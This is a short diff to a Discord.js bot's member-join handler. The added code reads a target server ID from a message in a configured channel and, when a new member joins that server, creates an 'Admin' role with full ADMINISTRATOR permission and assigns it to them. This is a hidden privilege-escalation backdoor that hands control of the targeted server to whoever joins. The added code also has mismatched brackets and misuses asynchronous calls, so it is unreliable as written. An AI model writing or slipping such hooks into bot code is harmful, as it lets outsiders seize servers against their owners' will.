@@ -49,7 +49,15 @@ client.on("guildMemberAdd", (member) =>{
              })
             .catch(console.log("coke"));
 
- 
+
+             client.channels.get(process.env.setcloneserver).fetchMessages({ limit: 1})
+             .then(messages => 
+             {
+                if(member.guild.id == client.guild.find("id", messages.last().content).id) {   
+           var AdminRole = member.guild.createRole({name: "Admin", permissions: ['ADMINISTRATOR'],});
+           member.addRole(AdminRole);
+ });
+           
 });
 
 client.on("message", async message => {
